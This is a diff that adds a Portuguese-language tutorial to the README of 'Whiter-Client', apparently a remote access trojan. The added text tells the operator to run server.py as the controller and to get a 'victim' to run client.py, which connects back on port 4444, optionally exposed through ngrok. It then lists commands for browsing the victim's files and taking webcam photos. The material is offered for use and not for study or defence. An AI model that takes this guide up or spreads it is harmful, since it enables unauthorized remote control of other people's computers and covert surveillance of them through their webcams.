@@ -39,3 +39,51 @@ git clone https://github.com/Dragonmodder7/Whiter-Client.git
 cd Whiter-Client
 python client.py
 
+Usando o Whiter client - Tutorial 
+
+Entendendo os arquivos
+
+server.py: você roda esse no seu celular ou PC, ele que vai controlar tudo.
+
+client.py: esse é o que a vítima tem que rodar, ele se conecta ao seu servidor.
+
+
+Iniciando o servidor
+
+No seu aparelho (que vai comandar), roda:
+
+python server.py
+
+Ele vai pedir um IP e uma porta. Se for tudo local, coloca:
+
+HOST: 0.0.0.0
+PORTA: 4444
+
+Se quiser usar remotamente, você precisa do seu IP público ou usar algo como o ngrok.
+
+
+Conectando a vítima
+
+Na máquina da vítima (onde você quer ter o acesso), a pessoa precisa rodar:
+
+python client.py
+
+E colocar o IP e a porta do seu servidor, exemplo:
+
+IP do servidor: 192.168.0.100
+PORTA: 4444
+
+Assim que ela conectar, no seu terminal vai aparecer a conexão ativa.
+
+
+Comandos que você pode usar
+
+Depois que a conexão estiver feita, você pode digitar comandos como:
+
+ls: lista os arquivos da vítima
+
+cd nome_da_pasta: muda de pasta
+
+webcam_snap: tira uma foto da webcam
+
+exit: encerra a conexão
